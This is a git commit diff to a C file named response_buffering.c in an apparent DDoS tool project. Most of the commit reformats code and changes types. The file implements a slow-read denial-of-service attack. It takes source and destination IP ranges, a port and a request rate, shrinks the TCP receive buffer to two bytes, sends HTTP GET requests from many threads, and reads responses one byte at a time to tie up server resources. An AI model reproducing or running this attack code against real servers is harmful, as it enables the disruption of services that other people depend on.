15b2f901e7dcc49c280be061d3c691b291df2321
Hansu Kim <cpm0722@gmail.com>
2021-04-03 22:24:27 +0900

    merge

--- srcs/ddos/response_buffering.c
+++ srcs/ddos/response_buffering.c
@@ -10,20 +10,20 @@
 #define RESPONSE_BUFFERING_CNT 50
 
 // session counting
-unsigned long g_resbuf_num_total;
-unsigned long g_resbuf_num_generated_in_sec;
+__u64 g_resbuf_num_total;
+__u64 g_resbuf_num_generated_in_sec;
 // from main()
-char g_resbuf_src_ip[16] = { 0, };
-char g_resbuf_dest_ip[16] = { 0, };
-unsigned int g_resbuf_src_mask;
-unsigned int g_resbuf_dest_mask;
-unsigned int g_resbuf_dest_port_start;
-unsigned int g_resbuf_dest_port_end;
-unsigned int g_resbuf_request_per_sec;
+unsigned char g_resbuf_src_ip[16] = { 0, };
+unsigned char g_resbuf_dest_ip[16] = { 0, };
+__u32 g_resbuf_src_mask;
+__u32 g_resbuf_dest_mask;
+__u32 g_resbuf_dest_port_start;
+__u32 g_resbuf_dest_port_end;
+__u32 g_resbuf_request_per_sec;
 // for masking next ip address
-char g_resbuf_now_src_ip[16];
-char g_resbuf_now_dest_ip[16];
-unsigned int g_resbuf_now_dest_port;
+unsigned char g_resbuf_now_src_ip[16];
+unsigned char g_resbuf_now_dest_ip[16];
+__u32 g_resbuf_now_dest_port;
 // thread
 pthread_mutex_t g_resbuf_mutex = PTHREAD_MUTEX_INITIALIZER;
 pthread_cond_t g_resbuf_cond = PTHREAD_COND_INITIALIZER;
@@ -31,15 +31,18 @@ pthread_cond_t g_resbuf_cond = PTHREAD_COND_INITIALIZER;
 struct timespec g_resbuf_before_time;
 struct timespec g_resbuf_now_time;
 
-void response_buffering_print_usage(void) {
+void response_buffering_print_usage(void)
+{
 	printf(
-			"response buffering Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
+			"response buffering Usage : "
+			"[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
 	return;
 }
 
-void* generate_response_buffering(void *data) {
+void *generate_response_buffering(void *data)
+{
 	int thread_id = *((int*) data);
-	//making tcp connection
+	// making tcp connection
 	int sock = -1;
 	int src_port, seq, ack;
 
@@ -51,69 +54,81 @@ void* generate_response_buffering(void *data) {
 	while (1) {
 		// *** begin of critical section ***
 		pthread_mutex_lock(&g_resbuf_mutex);
-
 		// get now resource
-		generator(g_resbuf_src_ip, g_resbuf_dest_ip, g_resbuf_src_mask,
-				g_resbuf_dest_mask, g_resbuf_dest_port_start,
-				g_resbuf_dest_port_end, g_resbuf_now_src_ip,
-				g_resbuf_now_dest_ip, &g_resbuf_now_dest_port);
-
+		generator(
+				g_resbuf_src_ip,
+				g_resbuf_dest_ip,
+				g_resbuf_src_mask,
+				g_resbuf_dest_mask,
+				g_resbuf_dest_port_start,
+				g_resbuf_dest_port_end,
+				g_resbuf_now_src_ip,
+				g_resbuf_now_dest_ip,
+				&g_resbuf_now_dest_port);
 		if (response_buffering_cnt % RESPONSE_BUFFERING_CNT == 0) {
 			/*
 			 if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
 			 perror("sock creation failed\n");
 			 }
-
-
 			 if (connect(sock, (struct sockaddr *) &servaddr, sizeof(servaddr)) < 0) {
 			 perror("connect failed\n");
 			 }*/
 			int rvsz = 2;
 			setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rvsz,
 					sizeof(rvsz));
-			rvsz=1;
-			setsockopt(sock,SOL_SOCKET,SO_KEEPALIVE,(const char*)&rvsz,sizeof(rvsz));
+			rvsz = 1;
+			setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, (const char*)&rvsz, sizeof(rvsz));
 
-			sock = tcp_make_connection(inet_addr(g_resbuf_now_src_ip),
-					inet_addr(g_resbuf_now_dest_ip), &src_port,
-					g_resbuf_now_dest_port, &seq, &ack,5000);
+			sock = tcp_make_connection(
+					inet_addr(g_resbuf_now_src_ip),
+					inet_addr(g_resbuf_now_dest_ip),
+					&src_port,
+					g_resbuf_now_dest_port,
+					&seq,
+					&ack,
+					5000);
 
 			char http_request[] = GET_METHOD;
 			/*if ((send(sock, http_request, strlen(http_request), 0)) < 0) {
 			 perror("get send err\n");
 			 }*/
-
-
-			tcp_socket_send_data(sock, inet_addr(g_resbuf_now_src_ip),
-					inet_addr(g_resbuf_now_dest_ip), src_port,
+			tcp_socket_send_data(
+					sock,
+					inet_addr(g_resbuf_now_src_ip),
+					inet_addr(g_resbuf_now_dest_ip),
+					src_port,
 					g_resbuf_now_dest_port,
-					GET_METHOD, strlen(GET_METHOD), seq, ack,2);
-
+					GET_METHOD,
+					strlen(GET_METHOD),
+					seq,
+					ack,
+					2);
 			response_buffering_cnt = 0;
 
-			fcntl(sock,F_SETFL,O_NONBLOCK);
+			fcntl(sock, F_SETFL, O_NONBLOCK);
 		}
 		// wait a second
 		if (g_resbuf_num_generated_in_sec >= g_resbuf_request_per_sec) {
 			pthread_cond_wait(&g_resbuf_cond, &g_resbuf_mutex);
 		}
 		// time checking
-		time_check(&g_resbuf_cond, &g_resbuf_before_time,
-				&g_resbuf_now_time, &g_resbuf_num_generated_in_sec);
+		time_check(
+				&g_resbuf_cond,
+				&g_resbuf_before_time,
+				&g_resbuf_now_time,
+				&g_resbuf_num_generated_in_sec);
 		// read a character
 		char buffer[2];
 		int recv_size = -1;
 		int sockaddrlen = sizeof(struct sockaddr_in);
-		recv_size = recvfrom(sock,buffer,1,0,NULL,sockaddrlen);
+		recv_size = recvfrom(sock, buffer, 1, 0, NULL, &sockaddrlen);
 		if (recv_size == -1) {
 			printf("no recv!\n");
 		}
-
 		/*tcp_socket_send_ack(sock, inet_addr(g_resbuf_now_src_ip),
 				inet_addr(g_resbuf_now_dest_ip), src_port,
 				g_resbuf_now_dest_port, seq, ack);*/
 		ack++;
-
 		printf("Read : %c\n", buffer[0]);
 		g_resbuf_num_generated_in_sec++;
 		g_resbuf_num_total++;
@@ -125,17 +140,22 @@ void* generate_response_buffering(void *data) {
 	return NULL;
 }
 
-void* response_buffering_time_check(void *data) {
+void *response_buffering_time_check(void *data)
+{
 	while (1) {
 		pthread_mutex_lock(&g_resbuf_mutex);
-		time_check(&g_resbuf_cond, &g_resbuf_before_time,
-				&g_resbuf_now_time, &g_resbuf_num_generated_in_sec);
+		time_check(
+				&g_resbuf_cond,
+				&g_resbuf_before_time,
+				&g_resbuf_now_time,
+				&g_resbuf_num_generated_in_sec);
 		pthread_mutex_unlock(&g_resbuf_mutex);
 	}
 	return NULL;
 }
 
-void response_buffering_main(char *argv[]) {
+void response_buffering_main(char *argv[])
+{
 	int argc = 0;
 	while (argv[argc] != NULL) {
 		argc++;
@@ -144,8 +164,13 @@ void response_buffering_main(char *argv[]) {
 		response_buffering_print_usage();
 		return;
 	}
-	split_ip_mask_port(argv, g_resbuf_src_ip, g_resbuf_dest_ip,
-			&g_resbuf_src_mask, &g_resbuf_dest_mask, &g_resbuf_dest_port_start,
+	split_ip_mask_port(
+			argv,
+			g_resbuf_src_ip,
+			g_resbuf_dest_ip,
+			&g_resbuf_src_mask,
+			&g_resbuf_dest_mask,
+			&g_resbuf_dest_port_start,
 			&g_resbuf_dest_port_end);
 	g_resbuf_num_generated_in_sec = 0;
 	g_resbuf_num_total = 0;
@@ -167,7 +192,7 @@ void response_buffering_main(char *argv[]) {
 		pthread_create(&threads[i], NULL, generate_response_buffering,
 				(void*) &thread_ids[i]);
 		/*RECEIVE THREAD DEACTIVATION*/
-		//pthread_create(&receive_thread[i],NULL,receive_get,(void*)&receive_thread_id[i]);
+		// pthread_create(&receive_thread[i],NULL,receive_get,(void*)&receive_thread_id[i]);
 	}
 	pthread_create(&threads[i], NULL, response_buffering_time_check,
 			(void*) &thread_ids[i]);
